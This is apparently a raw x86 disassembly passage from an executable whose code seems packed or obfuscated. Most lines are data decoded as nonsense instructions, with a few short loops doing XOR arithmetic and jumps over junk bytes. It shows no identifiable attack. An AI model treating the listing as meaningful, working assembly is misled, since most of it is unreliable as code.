  40f634:	(bad)  [ebp-0x32]
  40f637:	xor    dh,BYTE PTR [edx+0x18c2173c]
  40f63d:	push   es
  40f63e:	imul   esp,DWORD PTR [ecx],0x312ff503
  40f644:	mov    esp,0xab268eac
  40f649:	dec    ebx
  40f64a:	stos   DWORD PTR es:[edi],eax
  40f64b:	mov    esp,DWORD PTR ds:0x3fe935af
  40f651:	push   0x2d
  40f653:	sub    BYTE PTR [edi-0x4bc0c152],dl
  40f659:	xor    esi,ebp
  40f65b:	sbb    al,bl
  40f65d:	aad    0xc0
  40f65f:	test   BYTE PTR [edx-0x6a698b1],dh
  40f665:	int3   
  40f666:	inc    edx
  40f667:	loop   0x40f693
  40f669:	js     0x40f6ce
  40f66b:	inc    eax
  40f66c:	add    DWORD PTR [eax+ecx*8-0x48],eax
  40f670:	adc    esp,eax
  40f672:	les    eax,FWORD PTR [ebp-0x2b2c6d62]
  40f678:	xor    eax,0xfba4beee
  40f67d:	jge    0x40f6ca
  40f67f:	add    edi,DWORD PTR [esi]
  40f681:	ror    cl,1
  40f683:	ret    0xdcb7
  40f686:	out    0xc6,eax
  40f688:	jge    0x40f6d5
  40f68a:	sahf   
  40f68b:	push   edx
  40f68c:	retf   
  40f68d:	aam    0x2c
  40f68f:	stos   DWORD PTR es:[edi],eax
  40f690:	in     al,dx
  40f691:	rcr    BYTE PTR [edx+0x1e],0x5f
  40f695:	push   0xf9160b57
  40f69a:	ins    BYTE PTR es:[edi],dx
  40f69b:	rol    BYTE PTR [edx],cl
  40f69d:	fisttp WORD PTR [esi+0x4b]
  40f6a0:	mov    bl,0x57
  40f6a2:	and    ch,ah
  40f6a4:	jb     0x40f716
  40f6a6:	(bad)  [eax+0x3ba33d0b]
  40f6ac:	push   cs
  40f6ad:	sbb    dl,ch
  40f6af:	mov    al,ds:0xa2784754
  40f6b4:	(bad)  
  40f6b5:	arpl   si,di
  40f6b7:	dec    esi
  40f6b8:	cdq    
  40f6b9:	dec    ch
  40f6bb:	stos   DWORD PTR es:[edi],eax
  40f6bc:	jle    0x40f65b
  40f6be:	jmp    0x57293159
  40f6c3:	cmp    eax,DWORD PTR [ebx-0x1e776c2f]
  40f6c9:	mov    eax,0x2afe719c
  40f6ce:	cld    
  40f6cf:	xor    eax,0x6d30aa5d
  40f6d4:	jae    0x40f690
  40f6d6:	fucomip st,st(2)
  40f6d8:	and    ecx,DWORD PTR fs:[edi+edi*1-0x3ca2f876]
  40f6e0:	inc    eax
  40f6e1:	out    0xa6,eax
  40f6e3:	push   ebx
  40f6e4:	mov    dl,0xf8
  40f6e6:	sbb    al,0x59
  40f6e8:	and    al,0xe4
  40f6ea:	and    eax,0x4b4840a0
  40f6ef:	adc    BYTE PTR [ebp+0x5d],ch
  40f6f2:	out    dx,eax
  40f6f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6f4:	or     al,0xcf
  40f6f6:	mov    edi,0x92a0e4a7
  40f6fb:	jo     0x40f769
  40f6fd:	cmp    eax,0xb59a7aa0
  40f702:	sbb    edx,DWORD PTR [eax+0x7f1284ed]
  40f708:	shl    DWORD PTR [ecx],1
  40f70a:	cmc    
  40f70b:	push   ecx
  40f70c:	inc    ecx
  40f70d:	xor    al,0x4b
  40f70f:	ret    0x5336
  40f712:	push   0xad6e9980
  40f717:	mov    al,0xf3
  40f719:	add    DWORD PTR [eax-0xa],edi
  40f71c:	push   edi
  40f71d:	in     eax,0x0
  40f71f:	add    DWORD PTR [edi],0x14a8612b
  40f725:	sar    BYTE PTR [ecx-0x3cdedd29],cl
  40f72b:	aam    0x39
  40f72d:	int3   
  40f72e:	pushf  
  40f72f:	push   ebx
  40f730:	sub    bl,cl
  40f732:	jmp    FWORD PTR [ebx+esi*8+0x8]
  40f736:	add    BYTE PTR [edx-0x2d9b9f0a],cl
  40f73c:	jo     0x40f74d
  40f73e:	scas   al,BYTE PTR es:[edi]
  40f73f:	fwait
  40f740:	push   cs
  40f741:	mov    ds:0x603fde5b,eax
  40f746:	out    dx,al
  40f747:	pop    es
  40f748:	daa    
  40f749:	fmul   QWORD PTR [ecx-0x7337faf2]
  40f74f:	ja     0x40f6d6
  40f751:	aas    
  40f752:	pusha  
  40f753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f754:	repnz push 0xfffffffe
  40f757:	fadd   DWORD PTR [ecx-0x1145b341]
  40f75d:	(bad)
  40f760:	xchg   esi,eax
  40f761:	sbb    al,0x1e
  40f763:	loope  0x40f7c8
  40f765:	rol    esp,1
  40f767:	adc    BYTE PTR [ecx-0x4ece2db9],dh
  40f76d:	test   DWORD PTR [edi+0x5ac39c47],ebx
  40f773:	or     BYTE PTR [ebx],0xcc
  40f776:	(bad)  
  40f777:	add    ebp,DWORD PTR [ecx+0x4fb5d5f6]
  40f77d:	fistp  WORD PTR ds:[ebx]
  40f780:	add    eax,0x3eeb9123
  40f785:	xchg   edi,eax
  40f786:	sti    
  40f787:	lods   eax,DWORD PTR ds:[esi]
  40f788:	mov    esp,0xff4fd5c1
  40f78d:	pusha  
  40f78e:	pop    ebp
  40f78f:	sub    eax,0xbb0d017a
  40f794:	push   0x0
  40f796:	pop    ebp
  40f797:	bound  ecx,QWORD PTR ds:0xf82d
  40f79c:	loop   0x40f766
  40f79e:	lds    ebx,FWORD PTR [ebx+0x37]
  40f7a1:	mov    ?,WORD PTR [eax-0x6b0c15c4]
  40f7a7:	iret   
  40f7a8:	dec    eax
  40f7a9:	dec    ebp
  40f7aa:	mov    ecx,0xae2c1af8
  40f7af:	pop    es
  40f7b0:	pop    es
  40f7b1:	jno    0x40f824
  40f7b3:	aas    
  40f7b4:	push   ss
  40f7b5:	xchg   edx,eax
  40f7b6:	sub    DWORD PTR [edx],ecx
  40f7b8:	add    al,0xcd
  40f7ba:	push   cs
  40f7bb:	and    DWORD PTR [edi],ecx
  40f7bd:	dec    edx
  40f7be:	xchg   dl,ch
  40f7c0:	pop    edx
  40f7c1:	pop    eax
  40f7c2:	dec    ebx
  40f7c3:	(bad)  
  40f7c4:	in     eax,dx
  40f7c5:	xchg   edx,eax
  40f7c6:	xchg   edx,eax
  40f7c7:	add    ecx,DWORD PTR [ecx]
  40f7c9:	add    BYTE PTR [esi+ebp*2-0x5b],bh
  40f7cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7cf:	jb     0x40f779
  40f7d1:	gs mov ecx,0x455bb26e
  40f7d7:	(bad)  [ecx-0x6009efc4]
  40f7dd:	mov    bl,0x7f
  40f7df:	imul   BYTE PTR [eax-0x72]
  40f7e2:	shl    DWORD PTR [ebx-0x139d4809],0x3
  40f7e9:	sar    DWORD PTR [ebx],1
  40f7eb:	cli    
  40f7ec:	mov    DWORD PTR ds:0x42a779,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0xeba8eb5f,ch
  40f80a:	and    BYTE PTR ds:[edi+0x78],al
  40f80e:	js     0x40f7f5
  40f810:	jle    0x40f88a
  40f812:	js     0x40f85d
  40f814:	imul   esp,DWORD PTR [ebp-0x2e],0x8
  40f818:	mov    cl,0x38
  40f81a:	mov    al,0x5f
  40f81c:	inc    esi
  40f81d:	xchg   esi,eax
  40f81e:	xchg   esp,eax
  40f81f:	nop
  40f820:	xor    edx,DWORD PTR [edx]
  40f822:	mov    ebp,0x7df4aec2
  40f827:	data16 mov bh,0x92
  40f82a:	push   es
  40f82b:	mov    cl,0xe9
  40f82d:	lock ret 0xee36
  40f831:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f832:	fistp  QWORD PTR ds:0xb6f7003a
  40f838:	sti    
  40f839:	repz out 0x11,eax
  40f83c:	xchg   BYTE PTR [ebx+0x29],bl
  40f83f:	hlt    
  40f840:	daa    
  40f841:	mov    bl,0x5
  40f843:	and    al,0xf4
  40f845:	fdiv   QWORD PTR [edx-0x12387a2]
  40f84b:	or     eax,0x29d66224
  40f850:	and    al,0xc8
  40f852:	aaa    
  40f853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f854:	sar    BYTE PTR [ebp+0x29],1
  40f857:	adc    al,0x26
  40f859:	mov    bh,0xb1
  40f85b:	push   cs
  40f85c:	jns    0x40f846
  40f85e:	xchg   edx,eax
  40f85f:	xchg   esp,eax
  40f860:	pop    ebx
  40f861:	dec    ecx
  40f862:	pop    esp
  40f863:	xor    esp,DWORD PTR [edi+0x5fac6087]
  40f869:	mov    DWORD PTR [eax-0x26],esi
  40f86c:	pop    ebx
  40f86d:	inc    edi
  40f86e:	out    dx,eax
  40f86f:	scas   al,BYTE PTR es:[edi]
  40f870:	dec    edx
  40f871:	push   ebx
  40f872:	stos   DWORD PTR es:[edi],eax
  40f873:	fsubr  st,st(7)
  40f875:	bound  edx,QWORD PTR [ecx-0x5f8470e2]
  40f87b:	pop    esp
  40f87c:	shl    BYTE PTR [esi-0xb],0x85
  40f880:	js     0x40f889
  40f882:	or     ah,dl
  40f884:	ss pop ecx
  40f886:	jp     0x40f8d9
  40f888:	shr    ecx,cl
  40f88a:	inc    esp
  40f88b:	adc    ecx,DWORD PTR [ebp+0x39eb3386]
  40f891:	lahf   
  40f892:	xchg   BYTE PTR [eax+0x52e50ea2],bh
  40f898:	jmp    0x10d9:0x8819b7d5
  40f89f:	jae    0x40f91d
  40f8a1:	cmc    
  40f8a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8a4:	loope  0x40f91f
  40f8a6:	loopne 0x40f8a4
  40f8a8:	mov    ah,0x80
  40f8aa:	or     al,BYTE PTR [ecx]
  40f8ac:	jb     0x40f8eb
  40f8ae:	mov    ecx,0xd68495aa
  40f8b3:	jg     0x40f8d5
  40f8b5:	mov    ah,0x1e
  40f8b7:	jbe    0x40f908
  40f8b9:	cmp    bh,bl
  40f8bb:	outs   dx,DWORD PTR ds:[esi]
  40f8bc:	jnp    0x40f8b6
  40f8be:	jp     0x40f919
  40f8c0:	aas    
  40f8c1:	push   ss
  40f8c2:	arpl   sp,ax
  40f8c4:	sar    DWORD PTR [edx],1
  40f8c6:	hlt    
  40f8c7:	sub    BYTE PTR [esi+0x7c2b90e9],0x4a
  40f8ce:	jp     0x40f932
  40f8d0:	cmp    bh,al
  40f8d2:	and    DWORD PTR [ebp-0x5a3a2d34],0x4fd46606
  40f8dc:	popa   
  40f8dd:	add    cl,ch
  40f8df:	cli    
  40f8e0:	mov    bl,0x4e
  40f8e2:	cmp    al,0xaa
  40f8e4:	inc    edx
  40f8e5:	mov    ecx,0x94d44cff
  40f8ea:	dec    esp
  40f8eb:	xlat   BYTE PTR ds:[ebx]
  40f8ec:	mov    al,0x7b
  40f8ee:	xlat   BYTE PTR ds:[ebx]
  40f8ef:	cmc    
  40f8f0:	dec    esi
  40f8f1:	cmp    eax,DWORD PTR [edi+0x65e9ad0c]
  40f8f7:	fldcw  WORD PTR [ebx]
  40f8f9:	and    ah,ah
  40f8fb:	mov    edx,0xda89674d
  40f900:	adc    DWORD PTR [esi+0x9405a47],edx
  40f906:	in     al,dx
  40f907:	xor    DWORD PTR [ebx],ebp
  40f909:	mov    ds:0xe47ef06c,eax
  40f90e:	xor    al,0xda
  40f910:	das    
  40f911:	pop    ecx
  40f912:	data16 (bad) 
  40f914:	popa   
  40f915:	pop    esp
  40f916:	mov    ebx,0x3580ee13
  40f91b:	in     eax,dx
  40f91c:	fadd   DWORD PTR [edx+0x40b011d]
  40f922:	cwde   
  40f923:	test   eax,0xc8f04f7a
  40f928:	repz jo 0x40f8ec
  40f92b:	mov    cl,0xc6
  40f92d:	mov    esi,DWORD PTR [edx]
  40f92f:	fsubr  DWORD PTR [ecx+0x731bbbef]
  40f935:	mov    dl,0xa8
  40f937:	in     al,dx
  40f938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f939:	mov    eax,0xa573a592
  40f93e:	xor    BYTE PTR [eax],0xf4
  40f941:	jmp    0x756e1b32
  40f946:	popa   
  40f947:	setg   BYTE PTR [ecx]
  40f94a:	xchg   edi,eax
  40f94b:	and    BYTE PTR [esi+0xfa3e03b],ah
  40f951:	addr16 cwde 
  40f953:	push   ebp
  40f954:	fs adc dl,dl
  40f957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f958:	cmp    DWORD PTR [edi],0x62
  40f95b:	mov    DWORD PTR [ebp+0x72],edi
  40f95e:	ret    
  40f95f:	ret    0xa261
  40f962:	out    dx,al
  40f963:	and    BYTE PTR [ebp+0x3fc4b597],0x3c
  40f96a:	sahf   
  40f96b:	sbb    DWORD PTR [esi+0x5fe617bc],0xe25cff4b
  40f975:	add    ah,dh
  40f977:	mov    esp,0x2d0d0aa6
  40f97c:	mov    eax,0x3442408
  40f981:	jecxz  0x40f984
  40f983:	rcr    BYTE PTR [ebx],0xd8
  40f986:	mov    esi,DWORD PTR [eax]
  40f988:	cld    
  40f989:	xchg   ebx,eax
  40f98a:	nop
  40f98b:	push   edi
  40f98c:	mov    esi,0x64113c40
  40f991:	sub    dl,0x81
  40f994:	outs   dx,DWORD PTR ds:[esi]
  40f995:	sar    BYTE PTR ds:0x5137d267,0x69
  40f99c:	mov    esi,0xd033f1a5
  40f9a1:	mov    bl,0x5c
  40f9a3:	outs   dx,DWORD PTR ds:[esi]
  40f9a4:	out    dx,al
  40f9a5:	out    dx,al
  40f9a6:	stc    
  40f9a7:	(bad)  
  40f9a8:	loop   0x40f968
  40f9aa:	mov    edi,ebp
  40f9ac:	mov    edx,0x3d779d39
  40f9b1:	mov    WORD PTR [eax+ebp*8+0x756da078],ss
  40f9b8:	(bad)  
  40f9ba:	pop    ss
  40f9bb:	fistp  WORD PTR [esi]
  40f9bd:	cmc    
  40f9be:	push   edi
  40f9bf:	into   
  40f9c0:	mov    eax,ds:0xb867b03c
  40f9c5:	or     al,BYTE PTR [ebx+0x7c]
  40f9c8:	pop    edx
  40f9c9:	dec    eax
  40f9ca:	cmp    dh,BYTE PTR [ecx+ebx*4-0x1df9a39c]
  40f9d1:	push   ss
  40f9d2:	hlt    
  40f9d3:	or     BYTE PTR [esi+0x4e1613b0],al
  40f9d9:	sahf   
  40f9da:	cld    
  40f9db:	ficomp WORD PTR [ecx-0x29b2147]
  40f9e1:	(bad)  
  40f9e2:	das    
  40f9e3:	outs   dx,BYTE PTR ds:[esi]
  40f9e4:	pop    ecx
  40f9e5:	sub    eax,0xce5f359d
  40f9ea:	lods   al,BYTE PTR ds:[esi]
  40f9eb:	ins    BYTE PTR es:[edi],dx
  40f9ec:	dec    esi
  40f9ed:	pop    esi
  40f9ee:	fnstenv [edi+0x3]
  40f9f1:	pop    edx
  40f9f2:	pushf  
  40f9f3:	ss pop edi
  40f9f5:	lds    edx,FWORD PTR [esi+0x40]
  40f9f8:	ficomp DWORD PTR [edx]
  40f9fa:	aas    
  40f9fb:	dec    esi
  40f9fc:	pop    edx
  40f9fd:	mov    ds:0xdc1567d0,al
  40fa02:	inc    edx
  40fa03:	lahf   
  40fa04:	dec    ebx
  40fa05:	adc    al,0x4a
  40fa07:	mov    edx,0xc8523e9d
  40fa0c:	xchg   esp,edi
  40fa0e:	fcomp  DWORD PTR [edi]
  40fa10:	retf   0xd817
  40fa13:	xor    ebp,DWORD PTR [edx+ecx*4]
  40fa16:	pop    eax
  40fa17:	retf   0x4552
  40fa1a:	pop    ebp
  40fa1b:	xor    DWORD PTR [eax],esp
  40fa1d:	cli    
  40fa1e:	iret   
  40fa1f:	xchg   esi,eax
  40fa20:	dec    edx
  40fa21:	jmp    0x40fa85
  40fa23:	int    0x6
  40fa25:	sbb    ecx,DWORD PTR [edi+eiz*4]
  40fa28:	jo     0x40fa64
  40fa2a:	jl     0x40fa02
  40fa2c:	push   0xc77bc12c
  40fa31:	push   ecx
  40fa32:	test   eax,0xf89034df
  40fa38:	aas    
  40fa39:	sahf   
  40fa3a:	(bad)  
  40fa3b:	fmul   st,st(4)
  40fa3d:	xchg   edi,eax
  40fa3e:	sbb    BYTE PTR [ebx-0x1a],0xdf
  40fa42:	pushf  
  40fa43:	cmp    BYTE PTR [esi],cl
  40fa45:	aam    0x6f
  40fa47:	je     0x40fa05
  40fa49:	test   eax,0x97022359
  40fa4e:	pop    ebx
  40fa4f:	popf   
  40fa50:	out    dx,al
  40fa51:	das    
  40fa52:	mov    ah,0x34
  40fa54:	adc    cl,BYTE PTR [ecx+0x7c]
  40fa57:	aam    0x4
  40fa59:	sub    dl,dl
  40fa5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa5c:	lds    ebx,FWORD PTR [ebx]
  40fa5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa5f:	ss popa 
  40fa61:	out    dx,al
  40fa62:	stos   BYTE PTR es:[edi],al
  40fa63:	stos   BYTE PTR es:[edi],al
  40fa64:	or     al,0xa4
  40fa66:	in     al,0x57
  40fa68:	pushf  
  40fa69:	sti    
  40fa6a:	inc    edi
  40fa6b:	xor    ebx,0x40b83e03
  40fa71:	mov    eax,0x709736c0
  40fa76:	stos   BYTE PTR es:[edi],al
  40fa77:	inc    esi
  40fa78:	pop    eax
  40fa79:	shl    BYTE PTR [edi+0xf782c81],1
  40fa7f:	test   BYTE PTR [ebx+0x53000053],ch
  40fa85:	mov    DWORD PTR ds:0x42a809,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42a7c1,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42a7c1,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42a7c1,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42a7c1,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42a7c1
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42a7c1,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42a7c1
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42a7c1,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40faac
  40fb0f:	jne    0x40fae2
  40fb11:	(bad)  
  40fb12:	lea    eax,[ebp+0x78]
  40fb15:	js     0x40fafc
  40fb17:	jle    0x40fb91
  40fb19:	js     0x40fb99
  40fb1b:	retf   0xbc4
  40fb1e:	jmp    0x787d6e7
  40fb23:	sbb    ch,dh
  40fb25:	mov    esi,cs
  40fb27:	inc    esi
  40fb28:	popf   
  40fb29:	inc    edi
  40fb2a:	dec    ecx
  40fb2b:	jbe    0x40faea
  40fb2d:	leave  
  40fb2e:	mov    dl,0x6b
  40fb30:	fstp   QWORD PTR [ecx]
  40fb32:	(bad)  
  40fb33:	push   esp
  40fb34:	push   esp
  40fb35:	cld    
  40fb36:	(bad)  
  40fb37:	ins    DWORD PTR es:[edi],dx
  40fb38:	adc    DWORD PTR [ecx+0x49],ecx
  40fb3b:	xchg   DWORD PTR [edx+0x4fc39831],esp
  40fb41:	test   DWORD PTR [eax+ebx*8-0x29788a17],0x47f842e8
  40fb4c:	test   BYTE PTR ds:0x1017e72c,cl
  40fb52:	jnp    0x40fb1f
  40fb54:	(bad)  
  40fb56:	dec    ecx
  40fb57:	inc    edx
  40fb58:	popa   
  40fb59:	add    eax,0xedb467f1
  40fb5e:	sbb    eax,0xa5aaf26a
  40fb63:	in     eax,dx
  40fb64:	push   0xdbdb1a5c
  40fb69:	mov    bl,0xff
  40fb6b:	mov    edi,0xc94378db
  40fb70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb71:	dec    esp
  40fb72:	in     al,dx
  40fb73:	ss add esp,edi
  40fb76:	aam    0xbc
  40fb78:	push   edi
  40fb79:	lods   al,BYTE PTR ds:[esi]
  40fb7a:	jo     0x40fbc8
  40fb7c:	push   eax
  40fb7d:	jle    0x40fbc6
  40fb7f:	es mov esi,0x9119790a
  40fb85:	pusha  
  40fb86:	fwait
  40fb87:	(bad)  
  40fb88:	pop    ss
  40fb89:	mov    eax,0xc54cfaf5
  40fb8e:	sub    BYTE PTR [edx+0x21],0x58
  40fb92:	fdivr  st,st(2)
  40fb94:	mov    al,0x65
  40fb96:	xor    ch,BYTE PTR [eax-0x5b]
  40fb99:	mov    DWORD PTR [eax-0x266a27f7],eax
  40fb9f:	call   0x267875e1
  40fba4:	test   BYTE PTR [esp+edi*8+0x2de9c6fe],ah
  40fbab:	sub    BYTE PTR [ecx-0x5a053bcc],0xe
  40fbb2:	sar    DWORD PTR [ebx-0x1],1
  40fbb5:	cmp    ecx,DWORD PTR [ebx+0x51d97b71]
  40fbbb:	and    cl,BYTE PTR [edi]
  40fbbd:	out    0x96,al
  40fbbf:	and    eax,0x78b1f250
  40fbc4:	cmp    al,0x14
  40fbc6:	xchg   DWORD PTR [esi],edi
  40fbc8:	push   cs
  40fbc9:	jnp    0x40fc00
  40fbcb:	push   ecx
  40fbcc:	popf   
  40fbcd:	outs   dx,DWORD PTR ds:[esi]
  40fbce:	pop    esi
  40fbcf:	pop    esp
  40fbd0:	inc    esp
  40fbd1:	inc    ecx
  40fbd2:	adc    BYTE PTR [edx],bl
  40fbd4:	xor    al,0xa6
  40fbd6:	aad    0xd2
  40fbd8:	mov    edi,0x32ea2678
  40fbdd:	cmp    al,BYTE PTR [esi+ebx*8+0x1551996]
  40fbe4:	dec    esp
  40fbe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbe6:	xchg   esp,eax
  40fbe7:	and    al,0x46
  40fbe9:	dec    edi
  40fbea:	sahf   
  40fbeb:	sbb    DWORD PTR [edi],eax
  40fbed:	call   0x314fee48
  40fbf2:	daa    
  40fbf3:	js     0x40fbb4
  40fbf5:	mov    ebx,0x6f2f80fb
  40fbfa:	dec    esp
  40fbfb:	(bad)  
  40fbfc:	dec    esp
  40fbfd:	jg     0x40fc23
  40fbff:	jae    0x40fc44
  40fc01:	add    edi,DWORD PTR [ebx+0x61]
  40fc04:	adc    DWORD PTR [ebx],ebx
  40fc06:	fld    st(6)
  40fc08:	mov    dh,0xa3
  40fc0a:	inc    esp
  40fc0b:	push   eax
  40fc0c:	cmp    eax,0xcac0a262
  40fc11:	lods   eax,DWORD PTR ds:[esi]
  40fc12:	in     al,dx
  40fc13:	imul   edx,DWORD PTR [ecx+0x44d39ed9],0xa508319d
  40fc1d:	outs   dx,BYTE PTR ds:[esi]
  40fc1e:	jne    0x40fc7b
  40fc20:	cmp    BYTE PTR [edx+ecx*2-0x407bd02b],ah
  40fc27:	add    bl,BYTE PTR [ebx-0xb]
  40fc2a:	enter  0x2640,0x69
  40fc2e:	ret    0x4bfb
  40fc31:	push   0xce4365ff
  40fc36:	loopne 0x40fc93
  40fc38:	jns    0x40fbd7
  40fc3a:	stc    
  40fc3b:	idiv   DWORD PTR [edi+0x40]
  40fc3e:	sub    eax,0x7ed7d9de
  40fc43:	mov    ebp,DWORD PTR [ebx-0x24316aae]
  40fc49:	nop
  40fc4a:	aam    0x7a
  40fc4c:	push   ebx
  40fc4d:	call   0xa1f9:0xbd0ac05c
  40fc54:	adc    BYTE PTR [eax+0x21c90e60],ch
  40fc5a:	sar    BYTE PTR [eax-0x6325cf1a],1
  40fc60:	pop    esp
  40fc61:	mov    ecx,fs
  40fc63:	push   ds
  40fc64:	xor    dh,BYTE PTR [ebx]
  40fc66:	push   eax
  40fc67:	inc    ecx
  40fc68:	mov    ebp,0x8b8f0ab5
  40fc6d:	mov    eax,ds:0x9755059
  40fc72:	fwait
  40fc73:	inc    edi
  40fc74:	xchg   ebx,eax
  40fc75:	xor    DWORD PTR [edi+edi*1-0x4b191022],ebx
  40fc7c:	aad    0xcc
  40fc7e:	dec    esp
  40fc7f:	sbb    BYTE PTR [edi+0x1a],0xda
  40fc83:	in     eax,0x50
  40fc85:	xchg   esp,eax
  40fc86:	ret    0x535e
  40fc89:	les    edx,FWORD PTR [edx+0x10d5a4d0]
  40fc8f:	das    
  40fc90:	adc    eax,0xd75b695f
  40fc95:	out    0x5e,eax
  40fc97:	cmp    al,0x1
  40fc99:	push   0x4849d85b
  40fc9e:	cmp    BYTE PTR [edx-0x19],0x7f
  40fca2:	inc    ebp
  40fca3:	scas   al,BYTE PTR es:[edi]
  40fca4:	mov    edi,0xc4316416
  40fca9:	fnsave [eax-0x75]
  40fcac:	adc    BYTE PTR [ebp+esi*1-0x76be30f5],bl
  40fcb3:	call   0x39790a75
  40fcb8:	int    0xe0
  40fcba:	dec    esp
  40fcbb:	js     0x40fc66
  40fcbd:	or     ebp,DWORD PTR [ecx+ebx*4-0x6b]
  40fcc1:	mov    ecx,DWORD PTR [ebp+0x55c30d12]
  40fcc7:	xor    esp,ebx
  40fcc9:	jb     0x40fc55
  40fccb:	(bad)  
  40fccc:	jbe    0x40fcde
  40fcce:	dec    esi
  40fccf:	jb     0x40fc54
  40fcd1:	pop    edi
  40fcd2:	jnp    0x40fcb0
  40fcd4:	out    dx,al
  40fcd5:	jbe    0x40fcff
  40fcd7:	outs   dx,BYTE PTR ds:[esi]
  40fcd8:	lods   eax,DWORD PTR ds:[esi]
  40fcd9:	pop    es
  40fcda:	repnz and dl,BYTE PTR [eax+0x6c882a93]
  40fce1:	in     al,dx
  40fce2:	jb     0x40fd51
  40fce4:	jnp    0x40fce2
  40fce6:	jo     0x40fcba
  40fce8:	les    ebx,FWORD PTR [esp+ecx*8+0xa]
  40fcec:	test   DWORD PTR [ebx+edi*8-0x587158bb],0x4f65d3d0
  40fcf7:	inc    ebx
  40fcf8:	jecxz  0x40fd33
  40fcfa:	pop    ds
  40fcfb:	mov    ds:0x2ed343c6,al
  40fd00:	add    eax,0x69d4821b
  40fd05:	call   FWORD PTR [edi+0x51]
  40fd08:	call   0x61ba:0x42135ab9
  40fd0f:	mov    ch,0xbc
  40fd11:	xor    al,BYTE PTR [ebp-0x3b45ad1f]
  40fd17:	mov    edx,0x2b7b4e79
  40fd1c:	xor    BYTE PTR [ecx],ch
  40fd1e:	rol    DWORD PTR [ebp+0x6c3dc9e8],cl
  40fd24:	jnp    0x40fd1d
  40fd26:	push   ecx
  40fd27:	xchg   ebx,eax
  40fd28:	lods   eax,DWORD PTR ds:[esi]
  40fd29:	xchg   esi,eax
  40fd2a:	sub    edx,DWORD PTR [ebx+esi*1+0x20]
  40fd2e:	pop    edi
  40fd2f:	fwait
  40fd30:	(bad)  
  40fd31:	pop    ds
  40fd32:	sahf   
  40fd33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd34:	aas    
  40fd35:	sbb    al,0x1c
  40fd37:	js     0x40fd4c
  40fd39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd3a:	fdivr  DWORD PTR [ecx-0xc]
  40fd3d:	or     esi,ebx
  40fd3f:	sbb    edx,DWORD PTR [edx]
  40fd41:	xor    edi,DWORD PTR [edx+0x4a60ab7e]
  40fd47:	jb     0x40fd92
  40fd49:	or     al,0x19
  40fd4b:	outs   dx,DWORD PTR ds:[esi]
  40fd4c:	cmp    ebx,DWORD PTR [edi-0x33]
  40fd4f:	sti    
  40fd50:	js     0x40fdbf
  40fd52:	pop    ebp
  40fd53:	or     BYTE PTR gs:[ebx+0x31],bl
  40fd57:	lods   eax,DWORD PTR ds:[esi]
  40fd58:	pop    esi
  40fd59:	out    dx,eax
  40fd5a:	out    dx,al
  40fd5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd5c:	mov    ds:0xa5aaa803,eax
  40fd61:	js     0x40fd86
  40fd63:	sub    edx,DWORD PTR [edi-0x3592b8c3]
  40fd69:	cmp    esi,ebx
  40fd6b:	(bad)  
  40fd6c:	shr    BYTE PTR ds:0xef8ac64e,cl
  40fd72:	idiv   DWORD PTR [eax]
  40fd74:	call   0xe3273431
  40fd79:	pop    ecx
  40fd7a:	xor    eax,DWORD PTR [ecx-0x20]
  40fd7d:	and    DWORD PTR [edx-0x60dc17cc],edx
  40fd83:	cmc    
  40fd84:	scas   eax,DWORD PTR es:[edi]
  40fd85:	sub    edi,edx
  40fd87:	mov    edx,DWORD PTR [ebp-0x4]
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	adc    eax,0x7a403f45
  40fdc0:	dec    ebx
  40fdc1:	js     0x40fe3b
  40fdc3:	in     eax,0x7e
  40fdc5:	js     0x40fe3f
  40fdc7:	pop    eax
